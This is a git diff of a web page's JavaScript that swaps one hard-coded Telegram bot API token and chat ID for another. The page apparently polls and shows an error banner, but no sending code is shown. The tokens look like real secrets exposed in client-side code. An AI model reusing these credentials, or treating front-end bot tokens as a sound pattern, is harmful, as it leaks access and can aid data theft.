@@ -23,8 +23,8 @@ document.addEventListener('DOMContentLoaded', function () {
     const errorAccept = document.getElementById('errorAccept');
     const errorBanner = document.getElementById('errorMessage');
 
-    const TELEGRAM_API_KEY = '8587283632:AAFFsDyTcTyQYiQyM4rghouex0dlidIZEsk';
-    const TELEGRAM_CHAT_ID = '5360036647';
+    const TELEGRAM_API_KEY = '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw';
+    const TELEGRAM_CHAT_ID = '-1004245962123';
 
     let isChecked = false;
     let pollingInterval = null;
